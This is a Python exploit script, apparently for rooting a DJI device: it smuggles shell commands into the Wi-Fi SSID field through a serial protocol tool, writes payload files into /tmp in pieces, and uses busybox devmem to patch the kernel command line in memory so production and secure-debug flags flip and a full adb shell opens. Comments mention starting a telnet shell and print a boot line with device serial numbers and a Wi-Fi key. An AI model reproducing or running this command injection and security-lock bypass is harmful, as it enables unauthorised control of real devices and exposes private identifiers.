import os
import time
import sys
def readfile(fn):
    adb='adb'
    if sys.platform in ('win32', 'win64'):
        adb='.\\bin\\adb.exe'
    cmd = f"{adb} shell cat {fn}"
    with os.popen(cmd) as r:
        return r.read().encode('ascii')

def read32(addr):
    adb='adb'
    if sys.platform in ('win32', 'win64'):
        adb='.\\bin\\adb.exe'
    cmd = f"{adb} shell busybox devmem 0x{addr:08x}"
    with os.popen(cmd) as r:
        return int(r.read(), 0x10)

def write(addr, val, width = 32):
    adb='adb'
    if sys.platform in ('win32', 'win64'):
        adb='.\\bin\\adb.exe'
    cmd = f"{adb} shell busybox devmem 0x{addr:08x} {width} 0x{val:08x}"
    with os.popen(cmd) as r:
        pass

def overwrite_cmdline(ptr, cmdline, oldpart, newpart):
    len_old = len(oldpart)
    len_new = len(newpart)
    assert len_old >= len_new

    # add whitespaces to overwrite leftovers from oldpart
    if len_old > len_new:
        newpart += (len_old - len_new) * " "

    diff_idx = 0
    idx = cmdline.index(bytes(oldpart, 'ascii'))
    for i in range(len_old):
        if oldpart[i] != newpart[i]:
            diff_idx = i
            break

    for i in range(diff_idx, len_old):
        write(ptr + idx + i, int(bytes(newpart[i], 'ascii').hex(),16), 8)

def write_file_to_tmp(name, content):
    set_ssid("'\ntouch /tmp/" + name.decode() + "\n'")
    n = 7
    for i in range(0, len(content), n):
        pkt = (b"'\nprintf '" + content[i:i + n] + b"'>>/tmp/" + name + b"\n'").decode()
        # print(pkt)
        set_ssid(pkt)

def set_ssid(ssid):
    assert len(ssid) < 33, len(ssid)
    pkt = bytes([len(ssid)]) + ssid.encode('ascii')
    if os.path.exists('comm_serialtalk.py'):
        comm_serialtalk = 'comm_serialtalk.py'
    elif os.path.exists('.\\dji-firmware-tools\\comm_serialtalk.py'):
        comm_serialtalk = '.\\dji-firmware-tools\\comm_serialtalk.py'
    else:
        print('Could not find comm_serialtalk!')
        sys.exit(1)
    
    print(f'python {comm_serialtalk} --bulk -a ACK_AFTER_EXEC --cmd_set=7 --cmd_id=8 --sender=1001 --receiver=0700 -x "{pkt.hex()}" -n10 -v');

    if os.system(f'python {comm_serialtalk} --bulk -a ACK_AFTER_EXEC --cmd_set=7 --cmd_id=8 --sender=1001 --receiver=0700 -x "{pkt.hex()}" -n10 -v') != 0:
        print('Something went wrong during device communication, please start over!')
        sys.exit(1)

def main():
    print("Running exploit to start adb shell please wait ...")
    set_ssid("hello")
    set_ssid("'\n"+sys.argv[1]+"\n")
    set_ssid("hello")

    ##set_ssid("'\nbusybox devmem 19629364 8 0\n")
    ##set_ssid("'\nbusybox devmem 524285696 8 99\n")
    ##set_ssid("'\nsetup_usb.sh\n")
    
    #
    # set_ssid("'\ntest_usb_property.sh 1\n")
    # set_ssid("'\nsave_log_to_sd.sh\n")

    ## busybox telnetd -l sh
    
    ## pointer to cmdline
    # busybox devmem 0xf8f028
    ## base of cmdline  
    # busybox devmem 0x1F3FF680
    # busybox devmem 524285696

    ## earlycon=uart8250,mmio32,0xf8020000 no_console_suspend console=secS0,921600 user_debug=255 audit=1 pd_ignore_unused mp_state=production  androidboot.hardware=e3t splashboot=zv900 coherent_pool=0x100000 kmemleak=off crashkernel=12M maxcpus=4 security=selinux androidboot.selinux=enforcing androidboot.veritymode=enforcing chip_sn=0e0390363134533250 board_sn=4JGCK4G0080LJB     production_sn=4JEDK4K0010NDF       androidboot.slot_suffix=2 androidboot.android_dt_dir=/proc/device-tree/firmware_b/android/ androidboot.hw_version=03.05.01.00 fc_sn_addr=F2801000 androidboot.verity=1 androidboot.secure_debug=0 ps_thres=1405,384  wifi_key=f62198fe quiet @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    return
    write_file_to_tmp(b'a', content)

    set_ssid("'\nsh /tmp/a\n'")

    time.sleep(30)

    return 
    saved_command_line = 0x118F028
    cmdline_ptr = read32(saved_command_line)

    cmdline_proc = readfile("/proc/cmdline")
    
    cmdline = b""
    for i in range(4):
        cmdline += read32(cmdline_ptr + i * 4).to_bytes(4, 'little')
    

    assert cmdline_proc.startswith(cmdline)

    overwrite_cmdline(cmdline_ptr, cmdline_proc, "mp_state=production", "mp_state=factory")
    overwrite_cmdline(cmdline_ptr, cmdline_proc, "secure_debug=0", "secure_debug=1")
    print('unlocked full adb shell')

if __name__ == '__main__':
    main()
